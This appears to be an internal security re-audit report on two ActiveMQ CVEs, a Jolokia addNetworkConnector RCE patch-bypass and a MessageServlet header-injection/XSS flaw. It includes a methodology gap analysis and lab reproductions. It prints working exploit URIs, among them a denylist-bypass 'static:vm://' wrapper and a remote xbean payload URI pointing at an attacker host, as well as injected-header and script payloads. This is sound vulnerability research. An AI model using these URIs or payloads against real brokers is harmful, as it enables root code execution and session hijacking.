# ActiveMQ Re-Audit — CVE-2026-42588 & CVE-2026-42253

**Date:** 2026-06-02
**Trigger:** Two ActiveMQ CVEs disclosed after our 2026-04-30 audit that we missed.
**Targets used:**
- `apache/activemq-classic:6.2.0` (Docker) — vulnerable to both, MessageServlet + Jolokia enabled by default.
- ActiveMQ **5.19.6** binary dist (archive.apache.org) in `eclipse-temurin:17-jdk` — **34197-patched**, used to isolate 42588 as a true patch-bypass.
- Source: `apache/activemq` tags `activemq-5.19.6` and `activemq-5.19.7` (ground-truth fix diffs).

Both CVEs reproduced **live, end-to-end**. Lab kit + PoCs under `out/activemq-reaudit/lab/`.

---

## 1. Why we missed them (gap analysis)

Both bugs live in surfaces our April-30 audit had **already enumerated** in its context map. Not a wrong-codebase miss — two methodology gaps.

### CVE-2026-42588 — RCE via Jolokia `addNetworkConnector` (patch-bypass of CVE-2026-34197)
- We found & weaponized **CVE-2026-34197** (4/4 to root) and then wrote *"no novel RCE primitive beyond 34197."*
- 42588 reaches the **same** `VMTransportFactory` broker-creation → `ResourceXmlApplicationContext` → Spring-bean RCE **sink**, via a different discovery-wrapper scheme.
- **Root cause:** we confirmed the published trigger and stopped; we never **variant-hunted the proven sink** for other reach-paths. Vendor's 34197 fix guarded the *trigger* (a scheme denylist), not the *sink*.

### CVE-2026-42253 — HTTP header injection / XSS via `MessageServlet.setResponseHeaders`
- We mapped `MessageServlet.doGet/doPost` as entry points but **never source→sink traced them**, because our self-imposed **RCE-only scope** deprioritized the header-injection class.
- **Root cause:** the RCE lens silently dropped a textbook taint flow on an entry point we already had.

### Fixes to methodology (captured as reusable memory)
1. After confirming any CVE, **variant-hunt the proven sink** for alternate reach-paths (schemes, composite/wrapper URIs, encodings). → memory `feedback_post_cve_sink_variant_reaudit`
2. **Trace every mapped entry point for ALL bug classes**, not just the headline one. → memory `feedback_map_then_trace_all_classes`

---

## 2. CVE-2026-42588 — ground truth & reproduction

**Sink (unchanged across versions):** `addNetworkConnector(uri)` → discovery agent → `DiscoveryNetworkConnector.onServiceAdd` → `XBeanBrokerFactory.createBroker` → `ResourceXmlApplicationContext` loads remote/local Spring XML → singleton beans instantiate **before** broker validation → arbitrary code in broker JVM.

**The three defense layers (discovered empirically):**
| Layer | Where | 6.2.0 | 5.19.6 | 5.19.7 |
|---|---|---|---|---|
| Transport-scheme **denylist** | `BrokerView.DENIED_TRANSPORT_SCHEMES` (CVE-2026-34197 fix) | absent | present (**bypassed**) | present |
| Remote XML **protocol allow-list** | `spring/Utils.resourceFromString` | absent | present (file/classpath only) | present |
| **VMTransportFactory scheme allow-list** | `VMTransportFactory.validateBrokerCreationSchema` (**CVE-2026-42588 fix**) | absent | absent | **present** (`broker,properties`) |

**The 34197 denylist bypass:** `BrokerView.validateAllowedUri` only recurses into composite URIs detected by `URISupport.isCompositeURI`, which returns true **only if the scheme-specific part starts with `(`**. A *no-paren* wrapper —
`static:vm://EVIL?brokerConfig=xbean:...&create=true` — has `isCompositeURI()==false`, so only the outer scheme (`static`, not denied) is checked; the inner `vm` is **never validated**. `parseComposite` then still extracts the `vm://` service. (`isCompositeURI` and `parseComposite` disagree.)

**Live results:**
- **6.2.0 (unpatched):** `static:(vm://...brokerConfig=xbean:http://attacker/poc.xml)` → root RCE. Proof: `id` = `uid=0(root)`. (remote http payload works)
- **5.19.6 (34197-patched):**
  - `static:(vm://...)` → blocked: `Transport scheme 'vm' is not allowed`.
  - `static:vm://...` (no paren) → **denylist bypassed**; broker created; remote `http://` payload blocked by `Utils` (`protocol 'http' not allowed`).
  - `static:vm://lfp1?brokerConfig=xbean:/tmp/evil.xml&create=true` (local plain-path payload) → **root RCE**. Proof `/tmp/PROOF_42588_596` = `uid=0(root)`.
- **5.19.7 fix** (`VMTransportFactory` allow-list `broker,properties`) blocks `xbean` at the sink → chain dead regardless of denylist bypass or payload protocol.

**PoC:** `lab/pocs/poc_42588.py` (`--scheme static|masterslave`), payload `lab/attacker/poc_42588.xml`.

**Auth note:** default Jolokia policy (`jolokia-access.xml`) `strict-checking` is satisfied by a matching `Origin` header; the `<allow>` block permits `<operation>*` on `org.apache.activemq:*`, so `addNetworkConnector` exec is reachable with valid console creds (admin/admin default). On 6.0.0–6.1.1, CVE-2024-32114 leaves Jolokia **unauthenticated**.

---

## 3. CVE-2026-42253 — ground truth & reproduction

**Taint flow:**
- POST `/api/message/<dest>` → `MessageServletSupport.appendParametersToMessage`: every non-reserved request parameter → `message.setObjectProperty(name, value)` — **attacker controls property name AND value**.
- GET `/api/message/<dest>` → `MessageServlet.setResponseHeaders`:
  ```java
  for (Enumeration names = message.getPropertyNames(); names.hasMoreElements();) {
      String name = (String) names.nextElement();
      response.setHeader(name, message.getObjectProperty(name).toString()); // no sanitization
  }
  ```

**Live result (6.2.0):** POSTed a message with JMS properties, consumed it, and the response contained attacker-controlled headers:
- new header `X-Injected-By-Attacker: cve-2026-42253`
- `Content-Security-Policy:` overwritten to empty
- `Set-Cookie: session_hijack=1; Path=/`
- `Content-Type: text/html` (forced)
- body `<script>alert(document.domain)</script>` returned as HTML → **stored XSS**

**Fix (5.19.7/6.2.6):** `MessageServlet` marked `@Deprecated` and **disabled by default**. The vulnerable `setResponseHeaders` sink code is **unchanged** — mitigation is exposure-removal, so any deployment that re-enables MessageServlet remains vulnerable.

**PoC:** `lab/pocs/poc_42253.py`.

---

## 4. Lab teardown
```
docker rm -f amq620 amq596
```
Source trees: `out/activemq-reaudit/src-5.19.6`, `/tmp/*-597.java` diffs. Vulnerable 5.19.6 dist: `out/activemq-reaudit/amq596`.
